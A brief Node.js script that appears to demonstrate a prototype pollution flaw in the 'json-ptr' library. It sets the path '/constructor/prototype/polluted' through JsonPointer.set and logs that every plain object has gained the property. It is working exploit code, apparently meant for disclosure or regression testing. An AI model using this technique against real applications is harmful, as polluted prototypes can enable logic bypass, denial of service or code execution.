var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const {JsonPointer} = require('json-ptr');
JsonPointer.set(obj, '/constructor/prototype/polluted', 'yes', true);
console.log({}.polluted);